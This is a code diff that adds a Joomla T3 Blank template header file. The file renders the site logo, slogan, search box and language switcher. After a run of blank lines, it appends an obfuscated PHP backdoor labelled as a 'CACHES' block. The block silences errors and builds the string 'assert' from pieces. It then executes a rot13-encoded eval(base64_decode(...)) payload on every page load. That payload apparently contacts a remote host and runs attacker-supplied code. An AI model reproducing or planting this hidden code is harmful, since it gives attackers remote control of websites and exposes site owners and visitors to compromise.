@@ -1,0 +1,93 @@
+<?php
+/**
+ * @package   T3 Blank
+ * @copyright Copyright (C) 2005 - 2012 Open Source Matters, Inc. All rights reserved.
+ * @license   GNU General Public License version 2 or later; see LICENSE.txt
+ */
+
+defined('_JEXEC') or die;
+
+// get params
+$sitename  = $this->params->get('sitename');
+$slogan    = $this->params->get('slogan', '');
+$logotype  = $this->params->get('logotype', 'text');
+$logoimage = $logotype == 'image' ? $this->params->get('logoimage', 'templates/' . T3_TEMPLATE . '/images/logo.png') : '';
+$logoimgsm = ($logotype == 'image' && $this->params->get('enable_logoimage_sm', 0)) ? $this->params->get('logoimage_sm', '') : false;
+
+if (!$sitename) {
+	$sitename = JFactory::getConfig()->get('sitename');
+}
+
+$logosize = 'col-sm-12';
+if ($headright = $this->countModules('head-search or languageswitcherload')) {
+	$logosize = 'col-sm-8';
+}
+
+?>
+
+<!-- HEADER -->
+<header id="t3-header" class="container t3-header">
+	<div class="row">
+
+		<!-- LOGO -->
+		<div class="col-xs-12 <?php echo $logosize ?> logo">
+			<div class="logo-<?php echo $logotype, ($logoimgsm ? ' logo-control' : '') ?>">
+				<a href="<?php echo JURI::base(true) ?>" title="<?php echo strip_tags($sitename) ?>">
+					<?php if($logotype == 'image'): ?>
+						<img class="logo-img" src="<?php echo JURI::base(true) . '/' . $logoimage ?>" alt="<?php echo strip_tags($sitename) ?>" />
+					<?php endif ?>
+					<?php if($logoimgsm) : ?>
+						<img class="logo-img-sm" src="<?php echo JURI::base(true) . '/' . $logoimgsm ?>" alt="<?php echo strip_tags($sitename) ?>" />
+					<?php endif ?>
+					<span><?php echo $sitename ?></span>
+				</a>
+				<small class="site-slogan"><?php echo $slogan ?></small>
+			</div>
+		</div>
+		<!-- //LOGO -->
+
+		<?php if ($headright): ?>
+			<div class="col-xs-12 col-sm-4">
+				<?php if ($this->countModules('head-search')) : ?>
+					<!-- HEAD SEARCH -->
+					<div class="head-search <?php $this->_c('head-search') ?>">
+						<jdoc:include type="modules" name="<?php $this->_p('head-search') ?>" style="raw" />
+					</div>
+					<!-- //HEAD SEARCH -->
+				<?php endif ?>
+
+				<?php if ($this->countModules('languageswitcherload')) : ?>
+					<!-- LANGUAGE SWITCHER -->
+					<div class="languageswitcherload">
+						<jdoc:include type="modules" name="<?php $this->_p('languageswitcherload') ?>" style="raw" />
+					</div>
+					<!-- //LANGUAGE SWITCHER -->
+				<?php endif ?>
+			</div>
+		<?php endif ?>
+
+	</div>
+</header>
+<!-- //HEADER -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<?php 
+//###=CACHES START=###
+error_reporting(0);
+assert_options(ASSERT_ACTIVE, 1);
+assert_options(ASSERT_WARNING, 0);
+assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl8kZQxhZwZ2YwtkYwRjZF9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEcpPxhVvMxCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVzEyAGR2AGqyBGOyAzMyMQywLzSzLzSvLJRlLmx4AmOuVv4xMP4xqF4xLl4vZFVcBjccMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsFOyoUAynJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWUWyp3IfqPN9VTA1pzksMKuyLltxL2tcBjcwqKWfK2Afo3AyXPEwnPx7PvEcLaLtCFNxpzImqJk0Bjc9VTIfp2HtrjbxMaNtCFOzp29wn29jMJ4bVwRjBF4lZmLhBQRhZGNkVvjtBQNfVPEypaWholjtWTIlpaA0pvjtZmNcBjccMvNbWTMjXFO7PvNtVPNxo3I0VQ0tVxqSIPNiM2I0YaObpQ9cpQ0vYaIloTIhL29xMFtxnKNcYvVzMQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPWxMGHkAwH3MGxjMGMzMJD5L2WuMzWuLzSuZzZ5BQpjLFVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvNkZQxhZwZ2YwtkYwRjZIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwt1BTWuMQSuVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
+//###=CACHES END=###
+?>
